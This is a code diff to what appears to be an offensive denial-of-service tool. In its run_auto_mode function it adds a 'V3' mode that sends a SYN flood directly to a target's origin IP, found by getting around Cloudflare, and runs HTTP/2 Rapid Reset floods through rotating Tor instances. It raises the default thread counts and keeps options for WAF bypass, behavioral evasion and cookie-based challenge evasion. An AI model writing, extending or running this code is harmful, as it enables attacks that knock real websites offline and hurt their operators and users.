@@ -2547,9 +2547,6 @@ async def run_auto_mode(target: str, cfg: dict):
                     else:
                         print(f" {c('y','[!]')} Origin hunt timed out - hitting target directly")
 
-    if use_tor:
-        tor_input = get_input(" Tor instances (default 15): ").strip()
-        tor_instances = max(3, int(tor_input)) if tor_input.isdigit() else 15
     if use_proxy:
         try:
             opts = await prompt_attack_options(target, ask_proxy=True, ask_origin=False)
@@ -2597,14 +2594,32 @@ async def run_auto_mode(target: str, cfg: dict):
     if origin_ip:
         print()
         print(f" {c('c','[*]')} Auto Mode V3 available: Combined SYN Flood + Rapid Reset")
-        print(f"   {c('g','[+]')} SYN flood langsung ke origin IP ({origin_ip})")
-        print(f"   {c('g','[+]')} Rapid Reset via Tor (auto-rotate every 30-60s)")
+        print(f"   {c('g','[+]')} SYN flood -> origin IP ({origin_ip})")
+        print(f"   {c('g','[+]')} Rapid Reset via Tor (auto-rotate)")
         print(f"   {c('g','[+]')} Auto-detect 403/Connection reset -> ganti IP")
-        print(f"   {c('g','[+]')} Auto-logging with timestamps")
         v3_choice = get_input(" Use V3 combined attack? (Y/n): ").strip().lower()
         use_v3 = v3_choice != "n"
     
-    # Launch info panel
+    if use_v3:
+        # V3: SYN+RapidReset — skip V2 fluff, langsung gas
+        syn_thr = get_input(" SYN threads (default 1000): ").strip() or "1000"
+        rr_thr = get_input(" RR threads (default 500): ").strip() or "500"
+        tor_cnt = get_input(" Tor instances (default 15): ").strip() or "15"
+        print(f"\n {c('c','[*]')} V3 Target: {c('w',target)}")
+        print(f" {c('c','[*]')} V3 Origin: {c('w',origin_ip)} | SYN={syn_thr} | RR={rr_thr} | Tor={tor_cnt}")
+        from core.attack.strategies.auto_mode_v3 import run_auto_mode_v3
+        result = await run_auto_mode_v3(
+            target=target,
+            origin_ip=origin_ip,
+            duration=duration,
+            syn_threads=int(syn_thr),
+            rr_threads=int(rr_thr),
+            tor_instances=int(tor_cnt),
+            rotation_interval=45,
+        )
+        return result
+
+    # V3 not selected — continue with V2 launch info panel
     _RICH_CONSOLE.print()
     info_table = Table(box=box.SIMPLE, show_header=False, border_style="cyan")
     info_table.add_column("Key", style="bold white")
@@ -2612,33 +2627,22 @@ async def run_auto_mode(target: str, cfg: dict):
     info_table.add_row("Target", f"[cyan]{target}[/]")
     info_table.add_row("Origin IP", f"[{'green' if origin_ip else 'red'}]{origin_ip or 'auto-discover'}[/]")
     info_table.add_row("Duration", f"{duration}s")
-    info_table.add_row("Peak RPS", f"{target_rps if not use_v3 else 'N/A (V3 mode)'}")
-    info_table.add_row("Engine", "[bold green]V3: SYN+RapidReset[/]" if use_v3 else "auto (adaptive)")
+    info_table.add_row("Peak RPS", f"{target_rps}")
     info_table.add_row("Tor", f"[{'green' if tor_instances > 0 else 'red'}]{tor_instances} instances" if tor_instances > 0 else "[red]OFF[/]")
     info_table.add_row("Proxy Pool", f"[{'green' if proxy_pool else 'red'}]{len(proxy_pool) if proxy_pool else 'None'}[/]")
     info_table.add_row("HTTP/2", f"[{'green' if bypass.get('http2_impersonation') else 'red'}]{'ON' if bypass.get('http2_impersonation') else 'OFF'}[/]")
-    info_table.add_row("WAF Bypass", f"[{'green' if bypass.get('waf_parsing_bypass') else 'red'}]{'ON' if bypass.get('waf_parsing_bypass') else 'OFF'}[/]")
-    info_table.add_row("Behavioral", f"[{'green' if bypass.get('behavioral_evasion') else 'red'}]{'ON' if bypass.get('behavioral_evasion') else 'OFF'}[/]")
     info_table.add_row("FlareSolverr", f"[{'green' if flaresolverr_ok else 'red'}]{'ON' if flaresolverr_ok else 'OFF'}[/]")
     info_table.add_row("CF Cookies", f"[{'green' if cf_cookies else 'red'}]{'YES' if cf_cookies else 'NO'}[/]")
-    info_table.add_row("Phases", "[dim]RECON → WARMUP → RAMP → PEAK → VALIDATE → COOLDOWN[/]")
-    _RICH_CONSOLE.print(Panel(info_table, title=f"[bold cyan]Launching Auto Mode {'V3 - SYN+RapidReset' if use_v3 else 'V2'}[/]", border_style="cyan"))
+    _RICH_CONSOLE.print(Panel(info_table, title=f"[bold cyan]Launching Auto Mode V2[/]", border_style="cyan"))
     _RICH_CONSOLE.print()
     
+    if use_tor:
+        tor_input = get_input(" Tor instances (default 15): ").strip()
+        tor_instances = max(3, int(tor_input)) if tor_input.isdigit() else 15
+    else:
+        tor_instances = 0
+    
     try:
-        if use_v3:
-            # V3: Combined SYN Flood + Rapid Reset
-            from core.attack.strategies.auto_mode_v3 import run_auto_mode_v3
-            result = await run_auto_mode_v3(
-                target=target,
-                origin_ip=origin_ip,
-                duration=duration,
-                syn_threads=500,
-                rr_threads=100,
-                tor_instances=tor_instances,
-                rotation_interval=45,
-            )
-            return result
 
         # If bypass features are enabled, orchestrate with smart mode first
         if bypass.get("waf_parsing_bypass") or bypass.get("http2_impersonation"):
